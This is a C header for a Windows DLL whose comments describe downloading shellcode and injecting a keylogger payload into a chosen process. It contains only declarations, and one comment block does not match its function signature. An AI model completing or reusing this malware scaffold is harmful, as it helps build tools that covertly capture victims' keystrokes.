#ifndef MAINDLL_H
#define MAINDLL_H

#include <windows.h>

#define STATUS_SUCCESS (NTSTATUS)0x00000000L

#define InitializeObjectAttributes(p,n,a,r,s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->ObjectName = (n); \
    (p)->Attributes = (a); \
    (p)->RootDirectory = (r); \
    (p)->SecurityDescriptor = (s); \
    (p)->SecurityQualityOfService = NULL; \
}

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
    _In_ PVOID ThreadParameter
);

/**
 * @brief Entry point for the DLL.
 *
 * @param hinstDLL Handle to the DLL module.
 * @param fdwReason Reason for calling the function. Can be one of:
 *        - DLL_PROCESS_ATTACH: DLL is being loaded into the virtual address space of the current process.
 *        - DLL_PROCESS_DETACH: DLL is being unloaded from the virtual address space of the current process.
 * @param lpReserved Reserved. Not used.
 * @return Always returns TRUE.
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

/**
 * @brief Main function injecting a keylogger shellcode into the choosen process.
 *
 * @param processName Pointer to a null-terminated string specifying the process name.
 *                    Must not be NULL.
 * @return DWORD Process ID if the process exists, otherwise returns 0.
 */
BOOL injectPayload();

/**
 * @brief Downloads a shellcode payload into the provided buffer.
 *
 * @param shellcode Pointer to a buffer where the downloaded shellcode will be stored.
 * @param limit The known size of the downloaded shellcode.
 *
 * @return BOOL Returns TRUE if the shellcode was successfully downloaded into the buffer,
 *              otherwise returns FALSE.
 */
BOOL downloadPayload(unsigned char* shellcode, size_t limit);

#endif
